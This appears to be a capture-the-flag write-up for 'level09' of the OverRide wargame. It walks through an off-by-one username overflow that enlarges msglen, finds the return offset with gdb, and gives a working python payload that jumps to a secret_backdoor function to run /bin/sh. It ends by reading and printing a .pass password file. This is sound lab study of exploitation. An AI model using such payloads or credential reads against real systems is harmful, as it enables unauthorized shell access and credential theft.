for this level we have main function that call handle_msg(), this function create a stucture with the fields :  msg,  username,  and msglen.


then it call the function set_username that read from input a username
and copy it to the structure element username the vulnerabbility is that it copy 41 bytes in a buffer of size 40 (save.username)

    for(i = 0; i <= 40 && buf[i]; i++)

	then i go back to handle_msg and call set_msg

	wich will read input inside a buffer of 1024 bytes and copy save.msglen byte from input to save.msg

msglen variable is set to 140 (same size as the buffer msg in the structure)


the vulnerability is that the username[40] string will be overflower by 1 bytes it will allow us to set msglen to 255 and buffer overflow msg[140] to return to the function secret_backdoor

we need the offset :  python -c 'print("A"*40+"\xff"+"\n"+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"+"\n")' > /tmp/k
$ gdb ./level09
(gdb) r < /tmp/k
Starting program: /home/users/level09/level09 < /tmp/k
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x000000000000000a in ?? ()
(gdb) info register
rax            0xd	13
rbx            0x0	0
rcx            0x7ffff7b01f90	140737348902800
rdx            0x7ffff7dd5a90	140737351867024
rsi            0x7ffff7ff7000	140737354100736
rdi            0xffffffff	4294967295
rbp            0x6741356741346741	0x6741356741346741
rsp            0x7fffffffe4f0	0x7fffffffe4f0
r8             0x7ffff7ff7004	140737354100740
r9             0xc	12
r10            0x7fffffffdd90	140737488346512
r11            0x246	582
r12            0x555555554790	93824992233360
r13            0x7fffffffe5d0	140737488348624
r14            0x0	0
r15            0x0	0
rip            0xa	0xa
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 


so the register : rbp    0x6741356741346741	0x6741356741346741

so the offset of the rbp register is  192 add 8 to get the offset of RSP 
200

now we get the address of the function secret backdoor
(gdb) info functions secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor

so now we have the exploit :


A * 40  + \xff + \n + A * 200 + secret_backdoor Adress + \n + /bin/sh 

level09@OverRide:~$ (python -c 'print("A"*40+"\xff"+"\n"+"A"*200+"\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]+"\n"+"/bin/sh")';cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cd ../end	
cat .pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

